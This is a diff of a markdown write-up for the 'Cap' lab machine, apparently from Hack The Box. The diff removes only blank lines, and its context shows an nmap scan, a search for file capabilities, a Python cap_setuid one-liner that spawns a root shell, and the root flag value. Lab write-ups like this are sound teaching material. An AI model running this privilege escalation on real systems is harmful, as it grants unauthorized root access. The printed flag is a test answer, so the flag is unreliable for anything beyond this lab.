@@ -32,7 +32,6 @@ Cap is an easy difficulty Linux machine running an HTTP server that performs adm
 ## Nmap
 
 ```bash
-
 # Nmap 7.94SVN scan initiated Tue Oct  1 21:23:06 2024 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 21,22,80, 10.10.10.245
 Nmap scan report for 10.10.10.245
 Host is up, received user-set (0.18s latency).
@@ -151,7 +150,6 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Tue Oct  1 21:30:29 2024 -- 1 IP address (1 host up) scanned in 442.65 seconds
 ```
 
@@ -268,10 +266,8 @@ nathan@cap:/var/www/html$ /usr/sbin/getcap -r / 2>/dev/null | grep -iE 'cap_sys_
 
 ```bash
 nathan@cap:/var/www/html$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
-
 # id
 uid=0(root) gid=1001(nathan) groups=1001(nathan)
-
 # cat /root/root.txt
 0949e28c3d03e991c417f3140fba9b81
 ```
